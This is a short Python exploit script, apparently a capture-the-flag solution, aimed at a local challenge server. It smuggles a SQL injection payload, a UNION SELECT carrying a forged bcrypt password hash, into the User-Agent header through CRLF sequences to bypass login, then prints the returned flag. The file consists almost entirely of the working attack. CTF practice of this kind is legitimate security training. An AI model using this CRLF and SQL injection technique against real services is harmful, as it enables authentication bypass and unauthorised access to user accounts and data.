import requests, requests_raw, json 

HOST, PORT = "127.0.0.1", 1337
CHALLENGE_URL = f"http://{HOST}:{PORT}"

def pwn():
    with requests.Session() as session:
        dummy_payload = """{"username":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa","password":"aaaa"}"""
        sqli_payload = """{"username":"' UNION SELECT 1, 'test', '$2a$10$iN4TZptSPm634thWzJmklOEarWGSu6JbWTfNbWntYMqgoRsMsjLjq","password":"test"}"""
        
        resp = session.post(f"{CHALLENGE_URL}/user", data=eval(dummy_payload), headers={
            "User-Agent": f"ChromeBot/9.5%0D%0A%0D%0A{sqli_payload}"
        })

        return resp.text


def main():
    flag = pwn()
    print(flag)


if __name__ == "__main__":
    main()